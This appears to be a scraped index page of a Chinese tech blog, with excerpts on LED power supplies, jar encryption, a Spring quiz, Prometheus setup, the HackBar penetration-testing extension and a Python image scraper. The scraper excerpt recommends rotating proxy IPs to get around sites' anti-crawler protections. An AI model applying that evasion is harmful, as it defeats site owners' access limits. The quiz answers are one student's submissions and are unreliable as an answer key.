大功率LED驱动，一般要使用隔离电源，切不可为了省一点成本，而使用非隔离，不然得不偿失。小功率LED驱动，是使用隔离还是非隔离，要视具体情况而定。能使用隔离电源当然好，但至少要有两个条件，一是成本上允许，二是发热程度上允许，因为隔离电源这两个问题都是考验，而非隔离电源很多时候也是可以用。并且很多时候还是很好用的。非隔离电源适合的场合：首先，是室内的灯具，这种室内用电环境较好，浪涌影响小。第二，使用的场合是高压小电流，低压大电流用非隔离没有意义，因为低压大电流非隔离的效率并不比隔离的高，成本也低不到多少去。三，电压相对较稳定的环境中使用非隔离电源。当然，如果有办法解决掉抑制浪涌的问题，那么非隔离电源的应用范围将大大拓宽!隔离电源因为浪涌的问题，损坏率也不可小觑，一般那种返修回来，击坏保险，芯片，MOS的第一个应该想到是浪涌问题。为了减少损坏率，在设计时就行要考虑到浪涌的因素进去，或是在使用时要告戒用户，尽量避免浪涌发生。 引用地址： 开关电源选择技巧 隔离电源和非隔离电源的区别https://baijiahao.baidu.com/s?id=1752001348122752255&amp;wfr=spider&amp;for=pc带你真正认清隔离与非隔离电源的区别https://baijiahao.baidu.com/s?id=1718653961818353288&amp;wfr=spider&amp;for=pc
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/65b23186e56ea0be8b97d3c8b242bc78/" rel="bookmark">
			对SpringBoot项目Jar包进行加密防止反编译
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近项目要求部署到其他公司的服务器上,但是又不想将源码泄露出去,要求对正式环境的启动包进行安全性处理,防止客户直接通过反编译工具将代码反编译出来,本文介绍了如何对SpringBoot项目Jar包进行加密防止反编译,需要的朋友可以参考下
场景 最近项目要求部署到其他公司的服务器上，但是又不想将源码泄露出去。要求对正式环境的启动包进行安全性处理，防止客户直接通过反编译工具将代码反编译出来。
方案 第一种方案使用代码混淆
采用proguard-maven-plugin插件
在单模块中此方案还算简单，但是现在项目一般都是多模块，一个模块依赖多个公共模块。那么使用此方案就比较麻烦，配置复杂，文档难懂，各模块之间的调用在是否混淆时极其容易出错。
第二种方案使用代码加密
采用classfinal-maven-plugin插件
此方案比对上面的方案来说，就简单了许多。直接配置一个插件就可以实现源码的安全性保护。并且可以对yml、properties配置文件以及lib目录下的maven依赖进行加密处理。若想指定机器启动，支持绑定机器，项目加密后只能在特定机器运行。
ClassFinal项目源码地址
项目操作 只需要在启动类的pom.xml文件中加如下插件即可，需要注意的是，改插件时要放到spring-boot-maven-plugin插件后面，否则不起作用。
&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;!-- 1. 加密后,方法体被清空,保留方法参数、注解等信息.主要兼容swagger文档注解扫描 2. 方法体被清空后,反编译只能看到方法名和注解,看不到方法体的具体内容 3. 加密后的项目需要设置javaagent来启动,启动过程中解密class,完全内存解密,不留下任何解密后的文件 4. 启动加密后的jar,生成xxx-encrypted.jar,这个就是加密后的jar文件,加密后不可直接执行 5. 无密码启动方式,java -javaagent:xxx-encrypted.jar -jar xxx-encrypted.jar 6. 有密码启动方式,java -javaagent:xxx-encrypted.jar='-pwd= 密码' -jar xxx-encrypted.jar --&gt; &lt;groupId&gt;net.roseboy&lt;/groupId&gt; &lt;artifactId&gt;classfinal-maven-plugin&lt;/artifactId&gt; &lt;version&gt;1.2.1&lt;/version&gt; &lt;configuration&gt; &lt;password&gt;#&lt;/password&gt;&lt;!-- #表示启动时不需要密码,事实上对于代码混淆来说,这个密码没什么用,它只是一个启动密码 --&gt; &lt;excludes&gt;org.spring&lt;/excludes&gt; &lt;packages&gt;${groupId}&lt;/packages&gt;&lt;!-- 加密的包名,多个包用逗号分开 --&gt; &lt;cfgfiles&gt;application.yml,application-dev.yml&lt;/cfgfiles&gt;&lt;!-- 加密的配置文件,多个包用逗号分开 --&gt; &lt;libjars&gt;hutool-all.jar&lt;/libjars&gt; &lt;!-- jar包lib下面要加密的jar依赖文件,多个包用逗号分开 --&gt; &lt;code&gt;xxxx&lt;/code&gt; &lt;!-- 指定机器启动,机器码 --&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;classFinal&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; 启动方式 无密码启动
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/65b23186e56ea0be8b97d3c8b242bc78/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d7f113ae49e85e634fc3b5dae23c433/" rel="bookmark">
			Spring Boot基础 习题题库【附答案】5
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		温馨提示：全文近2w+字，重复有，请善用【Ctrl+F】进行页内查找 一. 单选题（共25题，100分） 1. (单选题)在Spring Data JPA,如果将@Transactional注解应用在一个类上,它将应用于哪些方法?
A. 只能应用于该类的静态方法
B. 仅应用于该类的public方法
C. 不会应用于任何方法
D. 应用于该类的所有方法
我的答案: B:仅应用于该类的public方法;
4分
2. (单选题)在Spring Data JPA中,如果要查询User实体中name属性以字母顺序升序排列的前10个用户,方法名应该如何命名?
A. getFirst10UsersOrderedByNameAscending()
B. findTop10ByOrderByNameAsc()
C. retrieveFirst10UsersOrderedByNameAsc()
D. queryUsersByNameInAlphabeticalOrder(int limit)
我的答案: B:findTop10ByOrderByNameAsc();
4分
3. (单选题)在Spring Data JPA中,@Modifying注解的主要作用是什么?
A. 用于指定自定义查询方法的返回类型。
B. 用于指定实体类的名称。
C. 用于标识执行修改操作的查询方法。
D. 用于定义自定义JPQL或SQL查询语句。
我的答案: C:用于标识执行修改操作的查询方法。;
4分
4. (单选题)在Spring Data JPA中, @Modifying注解通常与哪个注解一起使用来定义自定义修改查询方法?
A. @Transactional
B. @ModifyingQuery
C. @Query
D. @Entity
我的答案: C:@Query;
4分
5. (单选题)如果要根据实体对象的属性name模糊查询数据,方法名应该如何命名?
A. queryByEntityNameContains()
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8d7f113ae49e85e634fc3b5dae23c433/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/091754c7c8d111c86ed2697037350b53/" rel="bookmark">
			移动跨平台框架Flutter详细介绍和学习线路分享
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Flutter简介 Flutter是一款移动应用程序SDK，一份代码可以同时生成iOS和Android两个高性能、高保真的应用程序。 Flutter目标是使开发人员能够交付在不同平台上都感觉自然流畅的高性能应用程序。我们兼容滚动行为、排版、图标等方面的差异。 在全世界，Flutter正在被越来越多的开发者和组织使用，并且Flutter是完全免费、开源的。
Flutter原理 相比React Native和Weex，Flutter实现跨平台采用了更为彻底的方案（参考移动跨平台技术方案总结）。它既没有采用WebView也没有采用JavaScript，而是自己实现了一台UI框架，然后直接系统更底层渲染系统上画UI。所以它采用的开发语言不是JS，而Dart（Dart是面向对象的、类定义的、单继承的语言。它的语法类似C语言，可以转译为JavaScript，支持接口(interfaces)、混入(mixins)、抽象类(abstract classes)、具体化泛型(reified generics)、可选类型(optional typing)和sound type syste）。 据称Dart语言可以编译成原生代码，直接跟原生通信，其原理模型图如下：
同时，Flutter将UI组件和渲染器从平台移动到应用程序中，这使得它们可以自定义和可扩展。Flutter唯一要求系统提供的是canvas，以便定制的UI组件可以出现在设备的屏幕上，以及访问事件（触摸，定时器等）和服务（位置、相机等）。这是Flutter可以做到跨平台而且高效的关键。另外Flutter学习了RN的UI编程方式，引入了状态机，更新UI时只更新最小改变区域。
系统的UI框架可以取代，但是系统提供的一些服务是无法取代的。Flutter在跟系统service通信方式，采用的是一种类似插件式的方式，或者有点像远程过程调用RPC方式，这种方式据说也要比RN的桥接方式高效。关于RN和Flutter到底谁更优秀，有兴趣的读者可以关注下官方的撕逼大战React Native 团队怎么看待 Flutter 的。
Flutter 和 React Native 底层框架对比 React-Native、Weex 核心是通过 Javascript 开发，执行时需要 Javascript 解释器，UI 是通过原生控件渲染。Flutter 与用于构建移动应用程序的其它大多数框架不同，因为 Flutter 既不使用 WebView，也不使用操作系统的原生控件。 相反，Flutter 使用自己的高性能渲染引擎来绘 制 widget。Flutter 使用 C、C ++、Dart 和 Skia（2D渲染引擎）构建。
Skia 是一个 2D的绘图引擎库，其前身是一个向量绘图软件，Chrome 和 Android 均采用 Skia 作为绘图引擎。Android 自带了 Skia，所以 Flutter Android SDK要比 iOS SDK小很多。
在 ReactNative 中，引入了虚拟 DOM 来减少DOM的回流和重绘，系统将虚拟 DOM 与真正的 DOM 进行比较，生成一组最小的更改，然后执行这些更改，以更新真正的 DOM。最后，平台重新绘制真实的 DOM 到画布中。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/091754c7c8d111c86ed2697037350b53/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/642d82a04ac4ec4c22e7c94aae9f83a2/" rel="bookmark">
			使用virtual box运行自制img文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.点击新建一台虚拟机，输入虚拟机名称，根据需求设置内存大小、硬盘空间和CPU数量
2.选择新建的虚拟机点击设置
3.设置-&gt;存储-&gt;添加软盘
4.虚拟软盘选择，并点击注册把要运行的img文件添加进去
5.点击启动运行成功
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/202601ed809085371db9ced00c31e8a0/" rel="bookmark">
			H5: 使用Web Audio API播放音乐
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介 记录关于自己使用 Web Audio API 的 AudioContext 播放音乐的知识点。
需求分析 1.列表展示音乐；
2.上/下一首、播放/暂停/续播；
3.播放模式切换：循环播放、单曲循环、随机播放；
4.播放状态显示：当前播放的音乐名、播放时间、总时间、进度条效果；
5.播放控制器显示在底部区域；
6.支持音量调节；
7.浏览器隐藏、显示的交互后，也能正常有效播放（播放、声音）。
注意 安卓与IOS上有不同的兼容性，所以采用了 Web Audio API 的 AudioContext ，兼容性强大（但是截止写文章前，IOS17+版本不支持，没有声音）。
稍微复杂点点的逻辑就是AudioContext与手机系统的关联，可以看看 AudioContext: createMediaElementSource。
具体实现 test/music/musicPlayer/musics.ts
test/music/musicPlayer/useMusicPlayer.ts
test/music/index.vue
1.test/music/musicPlayer/musics.ts interface musicItem { title: string src: string time: string mp3Name: string } const musicList: musicItem[] = [ { title: 'How to Love', src: '', time: '03:39', mp3Name: 'sx_music_HowtoLove_CashCash' }, { title: '空空如也', src: '', time: '03:34', mp3Name: 'sx_music_kongkongruye' }, { title: '2 Soon', src: '', time: '03:19', mp3Name: 'sx_music_Soon_JonYoung' }, { title: '孤勇者', src: '', time: '04:16', mp3Name: 'sx_music_guyongzhe' }, { title: '秒针', src: '', time: '02:58', mp3Name: 'sx_music_miaozhen' }, { title: '热爱105˚的你', src: '', time: '03:15', mp3Name: 'sx_music_reai105dudeni' }, { title: '她会魔法吧', src: '', time: '03:01', mp3Name: 'sx_music_tahuimofaba' }, { title: '她会魔法吧', src: '', time: '03:01', mp3Name: 'sx_music_tahuimofaba' }, { title: '她会魔法吧', src: '', time: '03:01', mp3Name: 'sx_music_tahuimofaba' }, { title: '她会魔法吧', src: '', time: '03:01', mp3Name: 'sx_music_tahuimofaba' }, { title: '她会魔法吧', src: '', time: '03:01', mp3Name: 'sx_music_tahuimofaba' }, { title: '她会魔法吧', src: '', time: '03:01', mp3Name: 'sx_music_tahuimofaba' }, { title: '她会魔法吧', src: '', time: '03:01', mp3Name: 'sx_music_tahuimofaba' }, { title: '她会魔法吧', src: '', time: '03:01', mp3Name: 'sx_music_tahuimofaba' }, { title: '她会魔法吧', src: '', time: '03:01', mp3Name: 'sx_music_tahuimofaba' }, { title: '她会魔法吧', src: '', time: '03:01', mp3Name: 'sx_music_tahuimofaba' }, { title: '她会魔法吧', src: '', time: '03:01', mp3Name: 'sx_music_tahuimofaba' } ] // 音乐列表信息 export { type musicItem, musicList } 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/202601ed809085371db9ced00c31e8a0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db2b38d65c8ba77bc167499feb5fa435/" rel="bookmark">
			hackbar基于插件的网络渗透测试工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、安装 安装：通过Firefox在插件扩展里面找到hackbar v2进行安装(注意hackerbar是收费的；v2不是)
安装成功示例：
二、基本使用 1.Load URL 解释：将当前网页的url自动填充到多行文本框里面
2.Split URL 解释：自动的分割URL，快速找出需要改的地方
3.Excute 解释：自动执行操作
三、请求发送操作 1.GET 解释：直接发送即可，需要参数在文本框手动输入即可(例子：http://127.0.0.1/?chat=1)
2.POST 解释：在hackbar里面勾选post data然后输入参数（格式：a=1），此种方式发送的是表单格式的，post格式发送暂时还没有找到，找到的可以在评论区留言
示例：
注意：post多个参数时，写法：id=flag&amp;flag=0，当需要发送格式不为x=1的情况下，建议用burpsuit去拦截hackbar发送的包，然后修改post数据
四、插件 图示：
1.Encryption 解释：选中目标后点Encryption即可选择对选中内容的加密方式，目前有MD5、SHA-1、SHA-256、ROT13
2.Encoding 解释：选中目标后点Encoding即可选择对选中内容的编码方式，目前有Base64、URL编码、Hex编码
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ef483133f0d107fbc1052b84ef28f288/" rel="bookmark">
			新版本IntelliJ IDEA（如2023）中运行Spring Boot找不到VM options进行端口的修改的问题解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题 如下图找不到VM options。
解决 进行如下操作即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a78833b2736349375511c2ca68c1e53b/" rel="bookmark">
			WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题描述
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY! Someone could be eavesdropping on you right now (man-in-the-middle attack)! It is also possible that a host key has just been changed. The fingerprint for the ED25519 key sent by the remote host is SHA256:DRDBvCLO4xLJGzb1lQdmCFeBy/UyqnkIKncX8M9Avpk. Please contact your system administrator. Add correct host key in C:\Users\zwshi/.ssh/known_hosts to get rid of this message.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a78833b2736349375511c2ca68c1e53b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48d77e3c404aa22676a4d8230a4f834b/" rel="bookmark">
			prometheus docker部署安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		prometheus prometheus docker部署安装 之前用docker-compose部署过一套自动注册的prometheus，也用k8s的operator部署过一套，详情见promethues栏的文档。
时隔许久，今天在自己虚拟机部署一套promethues玩玩
准备工作 准备三台虚拟机，规格均为 1C 2G 20G，因为是自己玩，所以对性能啥的不要求了。
192.168.40.131 prometheus
192.168.40.132 node-exporter
192.168.40.133 grafana
安装promethues 之前安装prometheus，都是百度文档安装或者自己写dockerfile打镜像。这次安装尽量就别到处搜了，直接看官网。
题外话，官网的文档永远都是最正规的。你宁肯不相信官方也要相信一个不认识的人乱说吗？对吧
prometheus安装官网地址： https://prometheus.io/docs/prometheus/latest/installation/
但是官网提供的有一些瑕疵个人感觉，所以对命令做了些调整
#文件夹创建及授权 mkdir -p /usr/local/prometheus/;chmod 777 -R /usr/local/prometheus #创建并挂载暴露端口 docker run -itd --name prometheus -p 9090:9090 -v /etc/localtime:/etc/localtime:ro -v /usr/local/prometheus/conf:/etc/prometheus -v /usr/local/prometheus/data:/prometheus prom/prometheus 运行后应该是报错退出的状态，因为在conf下面没有配置文件，我们可以在官网找一个最基础的配置拷贝到本地的 /usr/local/prometheus/conf 下面并给可读权限
安装node-exporter 同样去看官网吧，官网地址：https://prometheus.io/docs/instrumenting/exporters/
这里提供了各种各样的exporter，可以根据自己需求点击跳转到github。根据Readme安装，我这也做了下优化
docker run -d --name node-exporter -p 9100:9100 --net="host" --pid="host" -v "/etc/localtime:/etc/localtime:ro" -v "/:/host:ro,rslave" quay.io/prometheus/node-exporter:latest --path.rootfs=/host 启动后修改prometheus配置
scrape_configs: # The job name is added as a label `job=&lt;job_name&gt;` to any timeseries scraped from this config.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/48d77e3c404aa22676a4d8230a4f834b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/810373fbd7b24945708ddfdcb4bd1727/" rel="bookmark">
			prometheus Error on ingesting samples that are too old or a re too far into the future
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 prometheus Error on ingesting samples that are too old or a re too far into the future 磁盘问题时间问题版本问题历史prometheus旧数据 prometheus Error on ingesting samples that are too old or a re too far into the future 之前在自己服务器上用docker部署过一个prometheus，今天更新到最新版本，结果发现在peometheus上检索我之前node-exporter的数据是没有的
查看prometheus日志发现
ts=2023-11-03T09:01:03.617Z caller=scrape.go:1741 level=warn component="scrape manager" scrape_pool=centos-40.132 target=http://192.168.40.132:9100/metrics msg="Error on ingesting samples that are too old or a re too far into the future" num_dropped=708ts=2023-11-03T09:01:03.617Z caller=scrape.go:1350 level=warn component="scrape manager" scrape_pool=centos-40.132 target=http://192.168.40.132:9100/metrics msg="Appending scrape report failed"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/810373fbd7b24945708ddfdcb4bd1727/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9baa4b75acb8e250838c40a7a7000572/" rel="bookmark">
			vim设置F8高亮的功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vim 安装molokai主题
tmux
tmux 终端复用详解
可以用来修改冲突 vim -O A文件(rej) B文件 此时掌握几个命令：
ctrl+双w：左右界面切换； /+字符串：在此文件搜索字符串匹配 shift+v：全选行； shift+v，上下键：选多行 y：复制 p：粘贴 dd：删除行 活用如上快捷键，可实现从左侧粘贴对应内容，并复制到右侧文件，同时删除想要删除行； 如上修改步骤：
1）光标指向左侧文件+行，shift+v选中，y复制； 2）ctrl+ww到右侧文件，光标指向对应修改行，p粘贴； 3）光标指向希望删除行，dd删除； 4）保存文件； 简单使用方法：
tmux
ctrl+b % 垂直分屏(组合键之后按一个百分号)，用一条垂线把当前窗口分成左右两屏。
ctrl+b " 水平分屏(组合键之后按一个双引号)，用一条水平线把当前窗口分成上下两屏。
切换pane ctrl+b o 依次切换当前窗口下的各个pane。
ctrl+b Up|Down|Left|Right 根据按箭方向选择切换到某个pane。
ctrl+b Space (空格键) 对当前窗口下的所有pane重新排列布局，每按一次，换一种样式。
ctrl+b z 最大化当前pane。再按一次后恢复。
关闭pane ctrl+b x 关闭当前使用中的pane，操作之后会给出是否关闭的提示，按y确认即关闭。
五
笔输入法：
sudo apt-get install fcitx-table-wubi
配置方法：https://www.cnblogs.com/panlangen/p/8728577.html vim保存文件 F8高亮，直接*/#也可以实现
map &lt;F8&gt; m`×`` 按住shfit按键，再鼠标右键点击也可以高亮
安装bundle：
git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim 在.vimrc中添加
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9baa4b75acb8e250838c40a7a7000572/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c47c24c86bdf569d2eee0893e89d982d/" rel="bookmark">
			Python操作CMD大揭秘！轻松玩转命令行控制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		导语： 命令行界面（Command Line Interface，简称CLI）是计算机操作系统中一种基于文本的用户界面，通过输入命令来与计算机进行交互。Python作为一门强大的编程语言，提供了丰富的库和模块，可以方便地操作CMD，本文将详细介绍如何使用Python来操作CMD，助您轻松玩转命令行控制。
一、Python中的os模块 os模块是Python中用于提供与操作系统进行交互的接口的一个标准库。通过os模块，我们可以执行CMD命令、获取当前目录、创建和删除文件夹等操作。
执行CMD命令
Python中的os模块提供了执行CMD命令的函数os.system(command)，其中command是要执行的CMD命令。例如，要在CMD中执行ping命令，可以使用以下代码：
import os # 执行CMD命令 os.system("ping www.example.com") 获取当前目录
使用os模块的os.getcwd()函数可以获取当前Python脚本所在的目录。例如，要获取当前目录并打印输出，可以使用以下代码：​​​​​​​
import os # 获取当前目录 current_dir = os.getcwd() # 打印输出当前目录 print("当前目录：", current_dir) 创建和删除文件夹
使用os模块的os.mkdir(path)函数可以创建文件夹，os.rmdir(path)函数可以删除文件夹。其中，path是要创建或删除的文件夹路径。例如，要在当前目录下创建一个名为"test"的文件夹，可以使用以下代码：​​​​​​​
import os # 创建文件夹 os.mkdir("test") 二、Python中的subprocess模块 subprocess模块是Python中用于创建新进程、连接到子进程并与其进行通信的标准库。通过subprocess模块，我们可以更灵活地操作CMD，包括获取CMD命令的输出、向CMD写入输入等。
获取CMD命令的输出
使用subprocess模块的subprocess.run(args, capture_output=True, text=True)函数可以执行CMD命令，并返回命令的输出结果。其中，args是要执行的CMD命令，capture_output=True表示捕获命令的输出，text=True表示以文本形式返回输出结果。例如，要获取CMD中执行"dir"命令的输出结果，可以使用以下代码：​​​​​​​
import subprocess # 执行CMD命令并获取输出 result = subprocess.run(["dir"], capture_output=True, text=True) # 打印输出结果 print(result.stdout) 向CMD写入输入
使用subprocess模块的subprocess.run(args, input=input_data, capture_output=True, text=True)可以执行CMD令，并向CMD写入输入。其中，args是要执行的CMD命令，input=input_data表示要写入的输入数据，capture_output=True表示捕获命令的输出，text=True表示以文本形式返回输出结果。例如，要向CMD中执行"ping"命令并写入输入"www.example.com"，可以使用以下代码：​​​​​​​
import subprocess # 执行CMD命令并写入输入 result = subprocess.run(["ping"], input="www.example.com", capture_output=True, text=True) # 打印输出结果 print(result.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c47c24c86bdf569d2eee0893e89d982d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a07d985bf2babf69c99c63b9651a71d5/" rel="bookmark">
			Python爬虫实战（六）——使用代理IP批量下载高清小姐姐图片（附上完整源码）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、爬取目标二、实现效果三、准备工作四、代理IP4.1 使用代理的好处？4.2 获取免费代理4.3 获取代理 五、代理实战5.1 导入模块5.2 设置翻页5.3 获取图片链接5.4 下载图片5.5 调用主函数5.6 完整源码5.7 代理IP不够用怎么办？ 六、总结 一、爬取目标 本次爬取的目标是某网站4K高清小姐姐图片：
二、实现效果 实现批量下载指定关键词的图片，存放到指定文件夹中：
三、准备工作 Python：3.10
编辑器：PyCharm
第三方模块，自行安装：
pip install requests # 网页数据爬取 pip install lxml # 提取网页数据 四、代理IP 4.1 使用代理的好处？ 爬虫使用代理IP的好处有以下几点：
轮换IP地址：使用代理IP可以轮换IP地址，降低被封禁的风险，从而保持爬取的连续性和稳定性。提高采集速度：代理IP可以提供多个IP地址，使得爬虫能够同时进行多个线程使用，从而加快数据的采集速度。绕过反爬虫机制：许多网站采取了各种反爬虫机制，例如IP封禁、验证码、请求频率限制等。使用代理IP可以帮助爬虫绕过这些机制，保持正常的数据采集。保护个人隐私：使用代理IP可以帮助隐藏真实的IP地址，保护个人身份和隐私信息。 博主经常写爬虫代码使用的是巨量IP家的高匿名代理IP，每天有1000个免费IP：点击免费试用
4.2 获取免费代理 1、打开巨量IP官网：巨量IP官网
2、输入账号信息进行注册：
3、这里需要进行实名认证，如果不会的可以看：个人注册实名教程：
4、进入会员中心，点击领取今日免费IP：
5、详细步骤看官方的教程文档：巨量HTTP—免费代理ip套餐领取教程，领取后如下图：
6、点击产品管理》动态代理（包时），可以看到我们刚才领取到的免费IP信息：
7、将自己电脑的IP添加为白名单能获取代理IP，点击授权信息：
8、依次点击修改授权》快速添加》确定
9、添加完成后，点击生成提取链接：
10、设置每次提取的数量，点击生成链接，并复制链接：
11、将复制链接，复制到地址栏就可以看到我们获取到的代理IP了：
4.3 获取代理 获取到图片链接后我们需要再次发送请求去下载图片，由于请求量一般会很大所以需要用到代理IP。上面我们已经手动获取到了代理IP，下面来看Python如何挂上代理IP发送请求：
1、通过爬虫去获取API接口的里面的代理IP（注意：下面代理URL，看4.2教程换成自己的API链接）：
import requests import time import random def get_ip(): url = "这里放你自己的API链接" while 1: try: r = requests.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a07d985bf2babf69c99c63b9651a71d5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/514ab8e1971c76fb8c9057a9988f4bbf/" rel="bookmark">
			mac 安装mysql 和navicat
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1安装 mysql mac上怎么安装mysql（教程）-mysql教程-PHP中文网
2 安装navicat Mac系统安装Navicat Premium数据库与汉化_mac上navicat汉化-CSDN博客
3 链接数据库报错 2059-Authentication plugin ‘caching_sha2_password‘ cannot be loaded:问题出现的原因及解决方法 2059-Authentication plugin ‘caching_sha2_password‘ cannot be loaded:问题出现的原因及解决方法_连接数据库2059-authentication plugin 'caching_sha2_pass_梦途的测开笔记的博客-CSDN博客
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b78b5469b9d44de74987fd1e7a48b4a3/" rel="bookmark">
			【Python】多进程线程与CPU核数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		多进程数量设置为CPU核数，或者略小于CPU核数；多线程数量，如果是CPU密集任务设为1；如果是IO密集设为合理的值；IO密集型：系统运作，大部分的状况是CPU 在等I/O （硬盘/内存）的读/写。计算密集型：大部份时间用来做计算、逻辑判断等CPU 动作的程序称之CPU 密集型。对于IO密集型，多线程效率高于多进程；对于计算密集型任务，多进程效率高于多线程。 总结一下
IO密集网络请求，文件读写多进程CPU核数（or略小于CPU核数）多线程合理值CPU密集计算，逻辑判断多进程CPU核数（or略小于CPU核数）多线程1 GIL全局锁：是python多线程。
多进程设置的大小与CPU核数的关系 在Python中，多进程的数量可以根据CPU核数来设置，以充分利用计算资源并提高程序的性能。通常情况下，可以将多进程的数量设置为机器的CPU核数，或者略少于CPU核数，以避免过度竞争资源而导致性能下降。
以下是一些关于Python多进程设置大小与CPU核数的一般准则：
1. CPU核数：首先，你可以使用`multiprocessing`模块中的`cpu_count()`函数来获取机器的CPU核数。例如：
import multiprocessing num_cpus = multiprocessing.cpu_count() 2. 多进程数量：根据机器的CPU核数，你可以将多进程的数量设置为相应的值。通常情况下，将多进程数量设置为CPU核数是一个合理的选择。例如：
num_processes = num_cpus 3. 考虑资源竞争：在设置多进程数量时，需要考虑到每个进程所需的资源（如内存、I/O等）。如果每个进程需要较多的资源，可以将多进程数量设置为略少于CPU核数，以避免过度竞争资源而导致性能下降。
需要注意的是，多进程的设置也取决于具体的应用场景和任务类型。有时候，根据具体情况进行实验和调整，找到最佳的多进程数量可能是更好的选择。此外，还可以考虑使用线程（`threading`模块）来实现并发操作，具体取决于任务的性质和需求。
多线程设置的大小与CPU核数的关系 在Python中，多线程的设置大小与CPU核数之间的关系是相对简单的。由于Python的全局解释器锁（GIL）机制限制了多线程的并行执行，因此多线程并不能充分利用多核处理器的能力。
在Python中，多线程适用于I/O密集型任务，如网络请求、文件读写等，因为这些任务通常会涉及等待时间，而在等待的过程中，其他线程可以继续执行。因此，对于I/O密集型任务，可以将多线程的数量设置为适当的值，以充分利用CPU的等待时间。
然而，对于CPU密集型任务，由于GIL的存在，多线程并不能实现真正的并行加速。在这种情况下，多线程的数量增加并不会提高程序的性能，反而可能由于线程之间的频繁切换而导致性能下降。因此，在CPU密集型任务中，通常建议将多线程的数量设置为1，以避免不必要的开销。
综上所述，多线程的设置大小与CPU核数之间的关系在Python中并不直接相关。对于I/O密集型任务，可以适当增加多线程的数量以充分利用CPU的等待时间；对于CPU密集型任务，通常将多线程的数量设置为1即可。需要根据具体的应用场景和任务类型来确定最佳的多线程设置。
参考：
python多进程 - 新战鲸的文章 - 知乎
多线程和进程比较 对于IO密集型，多线程效率高于多进程；
对于计算密集型任务，多进程效率高于多线程。
代码如下：
